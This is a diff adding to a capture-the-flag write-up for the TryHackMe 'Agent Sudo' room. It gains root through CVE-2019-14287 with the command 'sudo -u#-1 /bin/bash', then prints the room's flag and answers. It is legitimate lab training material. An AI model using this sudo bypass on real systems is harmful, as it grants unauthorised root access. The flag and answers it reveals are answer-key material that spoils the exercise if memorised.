@@ -488,4 +488,64 @@ b53a02f55b57d4439e3341834d70c062
 Q4 (Bonus) Who is Agent R?
 
 ```bash
-Deske
+Deskel
+```
+
+### MyWalk
+
+Lets try to root:
+
+```bash
+james@agent-sudo:~$ whoami
+james
+james@agent-sudo:~$ sudo -l
+[sudo] password for james:
+Matching Defaults entries for james on agent-sudo:
+env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+User james may run the following commands on agent-sudo:
+(ALL, !root) /bin/bash
+james@agent-sudo:~$ sudo su
+Sorry, user james is not allowed to execute '/bin/su' as root on agent-sudo.
+james@agent-sudo:~$
+```
+
+It looks like our user is not allowed to run /bin/bash as root since we have a !root. However, this looks weird as the first all means our user can run /bin/bash as any user. This is interesting, perhaps we can find a way to exploit this.
+As luck would have it, a google search returns us something we might be able to use to gain root privileges.
+
+Search for '!root /bin/bash' give us CVE-2019-14287 exploit-db.com link. Q1 done
+
+checking the exploit:
+
+```bash
+james@agent-sudo:~$ sudo -u#-1 /bin/bash
+root@agent-sudo:~# whoami
+root
+root@agent-sudo:~# cat /root/root.txt
+To Mr.hacker,
+
+Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine.
+
+Your flag is
+
+b53a02f55b57d4439e3341834d70c062
+
+By,
+
+DesKel a.k.a Agent R
+```
+
+Finally we have Q2 and Q3 also.
+
+## Tools:
+
+- nmap
+- gobuster
+- hydra
+- exiftool
+- xxd
+- binwalk
+- zip2john
+- johntheripper
+- 7z
+- cyberchef
+- steghide
